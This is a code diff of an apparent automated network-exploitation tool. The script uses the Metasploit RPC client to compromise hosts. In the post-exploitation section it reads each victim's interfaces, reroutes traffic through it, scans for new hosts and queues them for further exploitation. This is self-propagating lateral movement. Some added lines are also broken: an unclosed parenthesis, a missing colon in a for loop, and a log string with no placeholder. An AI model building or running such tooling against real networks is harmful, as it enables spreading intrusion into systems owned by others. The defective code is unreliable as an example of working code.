@@ -11,7 +11,7 @@ import json
 import time
 import copy
 import logging
-import traceback # for debug
+import traceback
 
 def main():
     ### setup
@@ -24,7 +24,7 @@ def main():
     dbClient = MongoClient()
     dbRef = dbClient["NetSprawl"]
     netMapTable = dbRef["Map"]
-    exploitTable = dbRef["Exploits"] # TODO export weights from Selector
+    exploitTable = dbRef["Exploits"]
 
     msfClient = MsfRpcClient("pass")
 
@@ -62,9 +62,9 @@ def main():
             identifyResults = json.loads(Identifier.scanCurrentNetwork())
             rootInterfaces = []
             hostsDiscovered = []
-            for network in identifyResults:
-                rootInterfaces.append(network["network"])
-                for hostIp in network["hosts"]:
+            for result in identifyResults:
+                rootInterfaces.append(result["network"])
+                for hostIp in result["hosts"]:
                     hostsDiscovered.append(hostIp)
 
         if rootHost == None:
@@ -180,26 +180,65 @@ def main():
 
 
         ### post-exploits
-        # drop and run identifier on exploited boxes
+        # identify new networks from exploited hosts
         # add new hosts to records + database
-        # enrich and exploit new hosts as usual
 
         if len(postexQueue) > 0:
             logger.info("Postexploiting...")
         while len(postexQueue) > 0:
             hostRecord = postexQueue.pop()
-            sessionDbg = {"IP": hostRecord.interfaces, "Exploit Used": hostRecord.exploitStatus["exploitUsed"], "Session Num":hostRecord.exploitStatus["msfSession"]}
-            logger.info(sessionDbg)
+            session = hostRecord.exploitStatus["msfSession"]
 
-            for postExploitAction in ["remote_host_netinfo", "remote_host_scan", "alter_network_routes"]:
-                results = Exploiter.callPostExploit(msfClient, postExploitAction, hostRecord.exploitStatus["msfSession"])
-                logger.info("{}: {}".format(postExploitAction, results))
-                # if err == 0:
-                #     logger.info("{}: {}".format(postExploitAction, results))
-                # else:
-                #     logger.info("Unable to execute {} against host".format(postExploitAction))
+            # list interfaces from exploited host
+            err, interfaces = Exploiter.callPostExploit(msfClient, "remote_host_netinfo", session)
+            if err == 1:
+                logger.info("Unable to retrieve net info from {}".format(hostRecord.interfaces))
+                continue
 
-            # TODO add new hosts to collection and to enricher queue
+            # check for newly discovered interfaces
+            if len(interfaces) > len(hostRecord.interfaces):
+                logger.info("Additional interface(s) identified for {}".format(interfaces))
+                hostRecord.interfaces = interfaces
+                netMapTable.update(
+                    {'_id': hostRecord.id},
+                    {'$set':
+                        {
+                            "interfaces": hostRecord.interfaces
+                        }
+                    }
+
+                # reconfigure routing to pass through
+                err = Exploiter.callPostExploit(msfClient, "alter_network_routes", session)
+                if err == 0:
+                    logger.info("Modified routing for {}".format(hostRecord.interfaces))
+                else:
+                    logger.info("Unable to modify routing for {}".format(hostRecord.interfaces))
+
+                # scan from updated host
+                # might make sense to have an identify queue, and move this task there
+                logger.info("Beginning IP scan from {}".format(hostRecord.interfaces))
+                err, ipsFound = Exploiter.callPostExploit(msfClient, "remote_host_scan", session)
+                if err == 1:
+                    logger.info("Unable to complete scan from {}".format(hostRecord.interfaces))
+                else:
+                    # for each unique ip: create a new host record, add to collection, db, and enrichQueue
+                    newIps = []
+                    for hostIp in ipsFound:
+                        uniqueIp = True
+                        for record in hostCollection:
+                            if hostIp in record.interfaces:
+                                uniqueIp = False
+                        if uniqueIp:
+                            newIps.append(hostIp)
+                    logger.info("New hosts discovered at IPs ".format(newIps))
+
+                    for newIp in newIps
+                        newRecord = Record([newIp], hostRecord.id)
+                        record = newRecord.toDict()
+                        netMapTable.insert(record)
+                        newRecord.id = record["_id"]
+                        hostCollection.append(newRecord)
+                        enrichQueue.append(newRecord)
 
 
 
